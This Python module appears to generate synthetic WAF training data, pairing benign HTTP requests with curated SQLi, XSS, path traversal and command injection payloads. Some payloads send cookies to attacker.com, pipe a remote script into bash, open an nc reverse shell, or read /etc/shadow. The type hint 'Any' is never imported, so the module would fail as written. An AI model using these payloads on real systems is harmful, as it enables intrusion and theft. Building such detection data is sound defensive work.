"""
Curated payload generator and synthesizer for WAF training.
Includes real-world SQLi, XSS, Path Traversal, and Command Injection payloads,
paired with diverse HTTP endpoints, query strings, and body formats.
"""

import random
from typing import List, Dict, Tuple
from .normalizer import normalizer

# Comprehensive attack payload dictionaries
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "') or ('1'='1",
    "' UNION SELECT null, username, password FROM users --",
    "' UNION SELECT 1, @@version, 3, 4 --",
    "1; DROP TABLE users; --",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
    "1' AND SLEEP(5)#",
    "1' ORDER BY 1,2,3--",
    "1' ORDER BY 10--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
    "'; EXEC xp_cmdshell('dir')--",
    "\" OR 1=1 --",
    "\" OR \"a\"=\"a",
    "admin\" --",
    "1 union select table_schema, table_name from information_schema.tables",
    "-1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
    "1' AND 1=2 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "' OR 'x'='x",
    "105 OR 1=1",
    "1' AND (SELECT 6432 FROM(SELECT COUNT(*),CONCAT(0x7170786271,(SELECT (ELT(6432=6432,1))),0x71787a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
    "' HAVING 1=1 --",
    "' GROUP BY id HAVING 1=1 --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script src='http://attacker.com/malicious.js'></script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src='javascript:alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<input type=\"text\" value=\"\" onfocus=\"alert(1)\" autofocus>",
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    "<details open ontoggle=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<video><source onerror=\"javascript:alert(1)\">",
    "<div onmouseover=\"alert(document.domain)\">Hover me</div>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>",
    "<object data=\"javascript:alert(1)\">",
    "<!--<script>alert(1)</script>-->",
    "<isindex action=\"javascript:alert(1)\" type=image>",
    "<link rel=import href=\"http://attacker.com/xss.html\">",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00.jpg",
    "../../../../boot.ini",
    "/var/log/apache2/access.log",
    "../../../../winnt/win.ini",
    "C:\\boot.ini",
    "C:\\inetpub\\wwwroot\\web.config",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "file:///etc/passwd",
    "../../../../app/config/database.yml",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\cmd.exe",
    "/etc/issue",
    "../../.env",
]

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| cat /etc/shadow",
    "&& whoami",
    "; whoami",
    "| whoami",
    "&& id",
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "& net user",
    "& ipconfig /all",
    "; uname -a",
    "|| ping -c 3 127.0.0.1",
    "&& curl http://attacker.com/shell.sh | bash",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "| powershell -command \"Get-Process\"",
    "; rm -rf /tmp/data",
    "$(cat /etc/passwd)",
    "& echo 'vulnerable' > /tmp/hacked.txt",
]

# Real-world Benign HTTP Request Templates
BENIGN_PATH_PARAMS = [
    ("GET", "/api/v1/products", "category=electronics&page=1&limit=20&sort=price_asc", ""),
    ("GET", "/api/v1/products", "search=wireless+noise+cancelling+headphones", ""),
    ("GET", "/api/v1/users/profile", "user_id=10492", ""),
    ("GET", "/articles", "tag=python&year=2026&author=guido", ""),
    ("GET", "/cart/items", "cart_id=c98234-a1", ""),
    ("GET", "/search", "query=machine+learning+tutorial+for+beginners", ""),
    ("GET", "/docs/installation", "version=3.11&os=windows", ""),
    ("GET", "/assets/css/main.css", "v=2.4.1", ""),
    ("GET", "/images/banner.png", "width=800&height=400", ""),
    ("GET", "/api/health", "", ""),
    ("GET", "/weather", "city=New+York&units=metric", ""),
    ("GET", "/order/status", "order_ref=ORD-8823192", ""),
    ("GET", "/catalog/browse", "filter=in_stock&brand=sony&min_price=50&max_price=300", ""),
    ("GET", "/dashboard/metrics", "period=30d&format=json", ""),
    ("GET", "/blog/post/42", "comments_page=1", ""),
    ("POST", "/api/v1/login", "", '{"username": "johndoe@example.com", "password": "SecurePassword123!"}'),
    ("POST", "/api/v1/register", "", '{"email": "alex.smith@test.edu", "full_name": "Alex Smith", "role": "student"}'),
    ("POST", "/api/v1/cart/add", "", '{"product_id": 4821, "quantity": 2, "discount_code": "SPRING26"}'),
    ("POST", "/api/v1/checkout", "", '{"cart_id": "c98234", "shipping_address": "123 Main Street, NY", "method": "card"}'),
    ("POST", "/api/feedback", "", '{"rating": 5, "comment": "Great user interface and fast response times."}'),
    ("POST", "/api/contact", "", '{"name": "Sarah Connor", "email": "sarah@resistance.org", "message": "Inquiry regarding cybersecurity protocols."}'),
    ("POST", "/api/comments", "", '{"post_id": 102, "text": "Thank you for the detailed article, it was very helpful!"}'),
    ("PUT", "/api/v1/user/settings", "", '{"theme": "dark", "notifications": true, "language": "en-US"}'),
    ("DELETE", "/api/v1/cart/item/4821", "", ""),
]

# Symmetrically shared endpoints and query keys to prevent shortcut learning
SHARED_ENDPOINTS = [
    "/api/v1/products",
    "/api/v1/users",
    "/api/v1/auth/login",
    "/api/v1/comments",
    "/api/v1/search",
    "/download",
    "/view",
    "/order/lookup"
]

SHARED_PARAM_KEYS = ["id", "search", "q", "category", "file", "user", "page", "query", "filter"]

BENIGN_VALUES = [
    "electronics", "books", "smartphones", "laptop", "101", "2048", "active",
    "wireless+headphones", "mechanical+keyboard", "alex", "john.doe", "invoice_2026.pdf",
    "report.csv", "true", "false", "newest", "price_asc"
]

USER_AGENTS_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
]

def generate_diverse_benign_samples(count: int = 3000) -> List[Dict[str, Any]]:
    samples = []

    for _ in range(count):
        endpoint = random.choice(SHARED_ENDPOINTS)
        ua = random.choice(USER_AGENTS_POOL)

        if random.random() < 0.60:
            # GET request with benign query params
            method = "GET"
            key = random.choice(SHARED_PARAM_KEYS)
            val = random.choice(BENIGN_VALUES)
            query = f"{key}={val}"
            body = ""
        else:
            # POST request with clean JSON (single-key or standard auth/order schemas)
            method = "POST"
            query = ""
            post_type = random.randint(1, 3)
            if post_type == 1:
                # Standard login
                user_name = random.choice(["alex.smith", "john.doe", "sarah.connor", "dev.user"])
                body = f'{{"username": "{user_name}", "password": "SecurePassword{random.randint(100, 999)}!"}}'
            elif post_type == 2:
                # Order / Cart update
                body = f'{{"product_id": {random.randint(100, 9999)}, "quantity": {random.randint(1, 5)}, "coupon": "DISCOUNT26"}}'
            else:
                key = random.choice(SHARED_PARAM_KEYS)
                val = random.choice(BENIGN_VALUES)
                body = f'{{"{key}": "{val}"}}'

        headers = {"user-agent": ua}
        if body:
            headers["content-type"] = "application/json"

        normalized = normalizer.serialize_request(
            method=method,
            path=endpoint,
            query_params=query,
            body=body,
            headers=headers
        )

        samples.append({
            "method": method,
            "path": endpoint,
            "params": query,
            "body": body,
            "normalized_text": normalized,
            "label": 0,
            "attack_type": "benign",
            "source": "curated_benign"
        })
    return samples

def generate_synthetic_dataset(num_samples: int = 6000) -> List[Dict[str, Any]]:
    """
    Generates a balanced dataset of realistic HTTP requests:
    - Benign requests (50%)
    - SQL Injection (12.5%)
    - Cross-Site Scripting (12.5%)
    - Path Traversal (12.5%)
    - Command Injection (12.5%)
    """
    samples = []
    attacks_per_class = num_samples // 8
    benign_count = num_samples // 2

    # 1. Generate Benign Samples
    benign_samples = generate_diverse_benign_samples(count=benign_count)
    samples.extend(benign_samples)

    # 2. Attack Samples using identical envelope structure
    attack_specs = [
        ("sqli", SQLI_PAYLOADS),
        ("xss", XSS_PAYLOADS),
        ("path_traversal", PATH_TRAVERSAL_PAYLOADS),
        ("cmdi", COMMAND_INJECTION_PAYLOADS),
    ]

    for attack_type, payload_list in attack_specs:
        for _ in range(attacks_per_class):
            payload = random.choice(payload_list)
            endpoint = random.choice(SHARED_ENDPOINTS)
            method = random.choice(["GET", "POST"])
            ua = random.choice(USER_AGENTS_POOL)

            if method == "GET":
                key = random.choice(SHARED_PARAM_KEYS)
                query = f"{key}={payload}"
                body = ""
            else:
                key = random.choice(SHARED_PARAM_KEYS)
                query = ""
                body = f'{{"{key}": "{payload}"}}'

            headers = {"user-agent": ua}
            if body:
                headers["content-type"] = "application/json"

            normalized = normalizer.serialize_request(
                method=method,
                path=endpoint,
                query_params=query,
                body=body,
                headers=headers
            )

            samples.append({
                "method": method,
                "path": endpoint,
                "params": query,
                "body": body,
                "normalized_text": normalized,
                "label": 1,
                "attack_type": attack_type,
                "source": "curated_attack"
            })

    random.shuffle(samples)
    return samples
